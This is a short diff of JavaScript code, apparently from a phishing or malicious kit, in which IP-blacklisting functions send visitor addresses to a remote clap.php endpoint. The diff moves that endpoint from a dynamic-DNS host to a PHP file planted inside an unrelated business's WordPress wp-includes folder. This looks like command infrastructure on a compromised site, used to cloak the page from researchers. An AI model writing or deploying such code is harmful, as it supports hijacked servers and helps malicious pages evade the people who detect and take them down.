@@ -103,11 +103,11 @@
 
     function addBlacklistedIP(ip) {
         // Check if IP is already in the blacklist
-        fetch('https://higplk.ooguy.com/yup/clap.php?ip=' + ip)
+        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
             .then(response => response.text())
             .then(data => {
                 if (data !== 'blacklisted') {
-                    fetch('https://higplk.ooguy.com/yup/clap.php', {
+                    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
@@ -136,7 +136,7 @@
 
     function checkBlacklistedIP(ip) {
         // Check if IP is already blacklisted in the database
-        fetch('https://higplk.ooguy.com/yup/clap.php?ip=' + ip)
+        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
             .then(response => response.text())
             .then(data => {
                 if (data === 'blacklisted') {
